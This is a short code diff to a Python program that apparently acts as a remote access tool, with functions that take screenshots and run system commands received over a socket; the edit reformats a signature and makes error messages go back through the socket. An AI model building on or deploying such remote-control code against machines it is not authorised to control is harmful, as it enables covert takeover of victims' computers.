@@ -295,9 +295,7 @@ def take_screenshot(socket) -> bool:
         return False
 
 
-def execute_system_command(
-    socket, command: str, timeout: int = 30
-) -> bool:
+def execute_system_command(socket, command: str, timeout: int = 30) -> bool:
     try:
         # Basic command validation
         if not command or not isinstance(command, str):
@@ -320,11 +318,15 @@ def execute_system_command(
 
         except subprocess.TimeoutExpired:
             result.kill()
-            return (False, b"[!] Error: Command timed out")
+            socket_send(socket, "[!] Error: Command timed out")
+            return False
 
     except FileNotFoundError:
-        return (False, b"[!] Error: Command not found")
+        socket_send(socket, "[!] Error: Command not found")
+        return False
     except subprocess.SubprocessError as e:
-        return (False, f"[!] Subprocess error: {str(e)}".encode())
+        socket_send(socket, f"[!] Subprocess error: {str(e)}")
+        return False
     except Exception as e:
-        return (False, f"[!] Unexpected error: {str(e)}".encode())
+        socket_send(socket, f"[!] Unexpected error: {str(e)}")
+        return False
